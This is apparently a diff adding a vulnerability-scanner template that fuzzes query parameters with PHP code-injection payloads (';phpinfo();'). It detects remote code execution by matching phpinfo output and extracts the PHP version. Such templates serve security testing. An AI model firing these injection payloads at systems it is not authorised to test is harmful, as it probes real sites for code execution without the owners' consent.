@@ -1,0 +1,46 @@
+id: phpinfo-rce
+
+info:
+  name: Simple phpinfo() fuzzing, 
+  author: reewardius
+  reference: https://www.invicti.com/learn/remote-code-execution-rce/
+  severity: medium
+  tags: fuzzing-rce,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+      
+    payloads:
+      rce:
+        - ";phpinfo();"
+        - "phpinfo()"
+        
+    fuzzing:
+      - part: query
+        mode: single
+        type: replace
+        fuzz:
+          - "{{rce}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "PHP Extension"
+          - "PHP Version"
+        condition: and
+        
+      - type: status
+        status:
+          - 200
+          
+    extractors:
+      - type: regex
+        part: body
+        group: 1
+        regex:
+          - '>PHP Version <\/td><td class="v">([0-9.]+)'
